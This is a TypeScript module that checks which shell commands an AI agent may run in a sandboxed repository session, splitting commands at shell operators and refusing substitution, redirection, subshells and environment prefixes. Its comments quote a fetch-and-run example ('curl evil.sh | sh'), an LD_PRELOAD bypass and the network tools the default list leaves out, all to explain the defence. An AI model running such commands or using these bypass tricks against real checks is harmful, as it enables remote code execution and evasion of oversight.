import type { Repository, RepositoryCommandMode } from "../db/entities/Repository.js";

/**
 * Which commands an AI Employee may run in a Repository work session.
 *
 * This module is pure: it parses a command string and decides against a list
 * of patterns. Everything about actually spawning a process — the sandbox, the
 * timeout, the operator's execution mode — lives in `repositoryCommandRun.ts`.
 *
 * Nothing here can *grant* anything. A session runs commands only behind
 * bubblewrap, and only where the install has it; `all` widens what Genosyn
 * will agree to run, never where it runs.
 *
 * ## What this is, and what it is not
 *
 * It is **not** the security boundary. That is bubblewrap: the command runs in
 * its own user, PID, IPC and UTS namespaces, with the session's worktree as
 * its whole filesystem and no network unless the operator turned it on. A
 * repository that allows every command is still confined to a throwaway
 * worktree whose diff a human reads before anything reaches a remote.
 *
 * Nor could it be the boundary, and pretending otherwise would be the failure
 * mode to avoid: a shell allowlist is porous by construction. `npm test` runs
 * whatever the repository's own `package.json` says, and `find -exec` runs
 * whatever follows it. That is not a hole to be plugged — running the
 * repository's own code is the job — which is exactly why the containment has
 * to come from the namespace rather than from this file.
 *
 * It is a **statement of intent**, and it is where the intent is enforced. A
 * session exists to change one repository; fetching a URL, opening an SSH
 * connection, or pushing a branch are not that, and a company should be able
 * to say so once on the Repository rather than hope. Where it stops being
 * merely a statement is an install that allows the sandbox network, which is
 * the one configuration in which what an employee reaches for can leave the
 * machine.
 *
 * ## Why the parsing is strict
 *
 * A pattern check that reads only the first word of a command is theatre:
 * `npm test && curl evil.sh | sh` passes it. So the command is split into
 * segments at every shell operator and each segment must match on its own,
 * and the constructs that would let a segment mean something other than what
 * it reads — command substitution, variable expansion, redirection — are
 * refused outright rather than guessed at. Anything that needs them is what
 * `all` mode is for.
 */

/**
 * The list a repository gets before anybody configures one.
 *
 * Chosen to cover the reason this feature exists — "run the tests, run the
 * linter, check it compiles" — across the ecosystems a company is likely to
 * have, and to leave out the verbs that are not what a work session is for:
 * no `curl` / `wget` / `ssh` / `nc`, no `git push` / `git remote` /
 * `git config`, no `sudo` / `apt` / `docker` / `kubectl`, no cloud CLIs.
 *
 * It deliberately does allow build tooling that can run arbitrary project
 * code (`npm test` runs whatever the repository's package.json says). That is
 * not a hole in the list — running the repository's own code *is* the job, and
 * the sandbox is what makes it safe. The list is about the employee's reach,
 * not the repository's.
 */
export const DEFAULT_ALLOWED_COMMANDS: string[] = [
  // JavaScript / TypeScript
  "npm *",
  "npx *",
  "pnpm *",
  "yarn *",
  "bun *",
  "node *",
  "deno *",
  "tsc *",
  "tsx *",
  "eslint *",
  "prettier *",
  "jest *",
  "vitest *",
  // Python
  "python *",
  "python3 *",
  "pip *",
  "pip3 *",
  "pytest *",
  "poetry *",
  "uv *",
  "ruff *",
  "mypy *",
  "black *",
  // Go / Rust
  "go *",
  "gofmt *",
  "cargo *",
  "rustc *",
  "rustfmt *",
  // JVM
  "mvn *",
  "gradle *",
  "./gradlew *",
  "javac *",
  "java *",
  // Ruby / PHP / .NET and friends
  "bundle *",
  "rake *",
  "ruby *",
  "rubocop *",
  "composer *",
  "php *",
  "dotnet *",
  "swift *",
  "mix *",
  "elixir *",
  "dart *",
  "flutter *",
  // Build drivers
  "make *",
  "cmake *",
  "ninja *",
  "just *",
  // Reading and moving files inside the worktree
  "ls *",
  "cat *",
  "head *",
  "tail *",
  "wc *",
  "grep *",
  "rg *",
  "fd *",
  "find *",
  "sed *",
  "awk *",
  "sort *",
  "uniq *",
  "cut *",
  "tr *",
  "diff *",
  "file *",
  "stat *",
  "du *",
  "mkdir *",
  "cp *",
  "mv *",
  "rm *",
  "touch *",
  "chmod *",
  "ln *",
  "tar *",
  "zip *",
  "unzip *",
  // Harmless shell built-ins people reach for without thinking
  "echo *",
  "printf *",
  "pwd",
  "env",
  "date",
  "which *",
  "true",
  "false",
  "sleep *",
];

/** Where a command was refused, and the sentence explaining it. */
export type CommandDecision = { allowed: true } | { allowed: false; reason: string };

/** How many patterns one repository may carry, so a paste cannot be unbounded. */
export const MAX_ALLOWED_COMMAND_PATTERNS = 500;

/** Longest single pattern, matching the width of the settings textarea's job. */
export const MAX_ALLOWED_COMMAND_PATTERN_LENGTH = 200;

/** Longest command an employee may ask to run. */
export const MAX_SESSION_COMMAND_LENGTH = 4000;

/**
 * Split the stored text into patterns: one per line, blanks and `#` comments
 * dropped, so an operator can annotate their list the way they would a
 * `.gitignore`.
 */
export function parseAllowedCommands(text: string): string[] {
  return text
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line.length > 0 && !line.startsWith("#"));
}

/** The patterns actually in force — the repository's own, or the built-in list. */
export function effectiveAllowedCommands(repo: Pick<Repository, "allowedCommands">): string[] {
  const own = parseAllowedCommands(repo.allowedCommands ?? "");
  return own.length > 0 ? own : DEFAULT_ALLOWED_COMMANDS;
}

/**
 * Tidy what a Member typed before it is stored, without editing it.
 *
 * Comments and the blank lines around them survive: the field invites them,
 * and a list that quietly came back stripped of its own annotations the first
 * time it was saved would teach people not to annotate it. Only the parts
 * nobody typed on purpose go — trailing whitespace on a line, and blank lines
 * at either end. The pattern count is bounded at the API boundary
 * (`repositoryValidation.ts`), which rejects an over-long list rather than
 * silently keeping the first few hundred lines of it.
 */
export function normalizeAllowedCommands(text: string): string {
  const lines = text.split(/\r?\n/).map((line) => line.trim());
  while (lines.length > 0 && lines[0] === "") lines.shift();
  while (lines.length > 0 && lines[lines.length - 1] === "") lines.pop();
  return lines.join("\n");
}

/**
 * One command segment: the words of a single simple command, already
 * unquoted. `npm run "build all"` is `["npm", "run", "build all"]`.
 */
type CommandSegment = { words: string[] };

type ParseResult = { segments: CommandSegment[] } | { error: string };

/**
 * Constructs whose meaning cannot be read off the text, and the sentence that
 * explains each refusal. Checked at the character the construct starts at, so
 * the message can name it.
 */
function refusalAt(command: string, index: number): string | null {
  const ch = command[index];
  const next = command[index + 1];
  if (ch === "`") {
    return "command substitution (backticks) hides what actually runs";
  }
  if (ch === "$") {
    return next === "("
      ? "command substitution (`$(…)`) hides what actually runs"
      : "variable expansion (`$NAME`) can stand for anything";
  }
  if ((ch === "<" || ch === ">") && next === "(") {
    return "process substitution (`<(…)`) hides what actually runs";
  }
  if (ch === "<" || ch === ">") {
    return "redirection (`<`, `>`, `>>`) sends output somewhere this check cannot see";
  }
  if (ch === "&" && next === ">") {
    return "redirection (`&>`) sends output somewhere this check cannot see";
  }
  if (/\d/.test(ch ?? "") && next === ">") {
    return "redirection (`2>`) sends output somewhere this check cannot see";
  }
  if (ch === "(" || ch === ")") {
    return "a subshell (`(…)`) runs commands this check cannot see";
  }
  return null;
}

/**
 * Break a command into the simple commands a shell would run, refusing the
 * constructs whose meaning cannot be read off the text.
 *
 * Quoting is honoured so that `grep "a && b" file` is one segment rather than
 * two, and `echo '$HOME'` is a literal rather than an expansion. This is not a
 * full shell grammar and does not try to be: everything it does not
 * understand, it refuses.
 *
 * Braces stay literal on purpose. `find . -name '*.log' -exec rm {} \;` is an
 * ordinary thing to write, and brace expansion cannot smuggle a command past
 * the check — `{curl,x}` is one word, matches no pattern, and is refused.
 *
 * The rule the whole thing has to hold to is that this reading and bash's
 * reading of the *same string* never disagree about where one command ends and
 * the next begins. Disagreeing in the safe direction is fine — seeing a
 * command bash would treat as a comment only causes an over-refusal. Any
 * disagreement in the other direction is a bypass, which is why comments and
 * line continuations are handled explicitly rather than left to fall through
 * as ordinary characters.
 */
export function parseCommandSegments(command: string): ParseResult {
  const segments: CommandSegment[] = [];
  let words: string[] = [];
  let current = "";
  let started = false;

  const endWord = (): void => {
    if (started) words.push(current);
    current = "";
    started = false;
  };
  const endSegment = (): void => {
    endWord();
    if (words.length > 0) segments.push({ words });
    words = [];
  };

  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i];

    if (ch === "'") {
      const close = command.indexOf("'", i + 1);
      if (close < 0) return { error: "the command has an unclosed single quote" };
      current += command.slice(i + 1, close);
      started = true;
      i = close;
      continue;
    }

    if (ch === '"') {
      let j = i + 1;
      let closed = false;
      while (j < command.length) {
        const inner = command[j];
        if (inner === "\\" && j + 1 < command.length) {
          current += command[j + 1];
          j += 2;
          continue;
        }
        if (inner === '"') {
          closed = true;
          break;
        }
        // Inside double quotes only substitution and expansion still act.
        // Redirection, `;`, `|` and the rest are already literal there.
        if (inner === "$" || inner === "`") {
          return {
            error: refusalAt(command, j) ?? "the command uses a construct that is not allowed",
          };
        }
        current += inner;
        j += 1;
      }
      if (!closed) return { error: "the command has an unclosed double quote" };
      started = true;
      i = j;
      continue;
    }

    if (ch === "\\") {
      if (i + 1 >= command.length) return { error: "the command ends in a dangling backslash" };
      // A backslash-newline is a line continuation, not a character.
      if (command[i + 1] !== "\n") {
        current += command[i + 1];
        started = true;
      }
      i += 1;
      continue;
    }

    // Bash starts a comment at an unquoted `#` that begins a word, and that
    // comment ends at the physical newline — a backslash inside it is *not* a
    // line continuation. Without this the two readings desync: the parser
    // would splice the next line onto the comment as more arguments to an
    // allowed command, while the shell runs it as a command of its own.
    // `started` is exactly bash's "begins a word" test; it is true mid-word
    // (`echo a#b` stays literal) and after an empty quoted string.
    if (ch === "#" && !started) {
      const newline = command.indexOf("\n", i + 1);
      if (newline < 0) break;
      // Leave the newline itself for the operator branch below, which is what
      // ends the segment.
      i = newline - 1;
      continue;
    }

    const refusal = refusalAt(command, i);
    if (refusal) return { error: refusal };

    if (ch === "|" || ch === ";" || ch === "&" || ch === "\n") {
      if (ch === "&" && command[i + 1] !== "&") {
        return { error: "running a command in the background (`&`) is not allowed" };
      }
      // Consume the second character of `&&` / `||` so it is not read again.
      if ((ch === "&" || ch === "|") && command[i + 1] === ch) i += 1;
      endSegment();
      continue;
    }

    if (ch === " " || ch === "\t" || ch === "\r") {
      endWord();
      continue;
    }

    current += ch;
    started = true;
  }

  endSegment();
  if (segments.length === 0) return { error: "there is no command to run" };
  return { segments };
}

/**
 * Whether one already-unquoted word matches one pattern word.
 *
 * `*` inside a word stands for any run of characters, so `test:*` matches
 * `test:unit`. Everything else is literal.
 */
function wordMatches(pattern: string, word: string): boolean {
  if (!pattern.includes("*")) return pattern === word;
  const source = pattern
    .split("*")
    .map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
    .join(".*");
  return new RegExp(`^${source}$`).test(word);
}

/**
 * Whether a segment matches one pattern.
 *
 * A pattern is a sequence of words. A bare `*` as the final word matches every
 * remaining word, including none — which is what makes `npm *` mean "any npm
 * command" and `git status` mean only itself.
 */
export function segmentMatchesPattern(pattern: string, words: string[]): boolean {
  const patternWords = pattern.split(/\s+/).filter(Boolean);
  if (patternWords.length === 0) return false;
  const trailingWildcard = patternWords[patternWords.length - 1] === "*";
  const fixed = trailingWildcard ? patternWords.slice(0, -1) : patternWords;
  if (trailingWildcard ? words.length < fixed.length : words.length !== fixed.length) return false;
  return fixed.every((patternWord, index) => wordMatches(patternWord, words[index]));
}

/**
 * The whole decision for one command.
 *
 * Every segment must match, and the first one that does not is named in the
 * refusal — an employee that is told "`curl` is not allowed" can report that
 * precisely to the human, and the human knows exactly what to add.
 */
export function decideCommand(args: {
  mode: RepositoryCommandMode;
  patterns: string[];
  command: string;
}): CommandDecision {
  const command = args.command.trim();
  if (!command) return { allowed: false, reason: "There is no command to run." };
  if (command.includes("\0")) {
    return { allowed: false, reason: "A command must not contain NUL bytes." };
  }
  if (command.length > MAX_SESSION_COMMAND_LENGTH) {
    return {
      allowed: false,
      reason: `A command may be at most ${MAX_SESSION_COMMAND_LENGTH} characters.`,
    };
  }
  if (args.mode === "off") {
    return {
      allowed: false,
      reason:
        "This repository does not let AI employees run commands. An owner or admin can turn them on at the repository's Settings page.",
    };
  }
  // `all` is the whole point of `all`: no parsing, no matching, no refusal
  // that a human did not intend. The sandbox is still there.
  if (args.mode === "all") return { allowed: true };

  const parsed = parseCommandSegments(command);
  if ("error" in parsed) {
    return {
      allowed: false,
      reason: `This command was refused because ${parsed.error}. Run the parts separately, or ask a Member to allow every command on this repository's Settings page.`,
    };
  }

  for (const segment of parsed.segments) {
    // `LD_PRELOAD=… npm test` reads as an allowed `npm test` and is not one.
    // The command word has to be the first word for the match to mean anything.
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(segment.words[0])) {
      return {
        allowed: false,
        reason:
          "Setting an environment variable in front of a command (`NAME=value cmd`) is only available when the repository allows every command.",
      };
    }
    const matched = args.patterns.some((pattern) => segmentMatchesPattern(pattern, segment.words));
    if (!matched) {
      return {
        allowed: false,
        reason:
          `\`${segment.words.join(" ")}\` is not on this repository's list of allowed commands. ` +
          "Use a command that is, or say in your reply what you would have run and why — an owner or admin adds it at the repository's Settings page.",
      };
    }
  }
  return { allowed: true };
}

/** The same decision, read straight off a Repository row. */
export function decideRepositoryCommand(
  repo: Pick<Repository, "commandMode" | "allowedCommands">,
  command: string,
): CommandDecision {
  return decideCommand({
    mode: repo.commandMode,
    patterns: effectiveAllowedCommands(repo),
    command,
  });
}
